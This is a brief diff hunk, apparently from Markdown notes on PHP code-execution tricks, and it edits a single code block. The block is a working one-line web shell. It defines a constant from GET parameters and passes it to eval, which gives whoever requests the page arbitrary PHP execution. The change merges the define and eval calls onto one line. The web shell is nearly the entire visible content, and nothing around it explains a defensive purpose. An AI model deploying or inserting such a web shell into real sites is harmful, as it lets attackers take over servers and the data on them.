@@ -401,9 +401,7 @@ echo "$var";
 ```php
 <?php
 
-    define($_GET[a], $_GET[b]);
-
-    eval(A);
+    define($_GET[a], $_GET[b]);eval(A);
 
     ?>
 ```
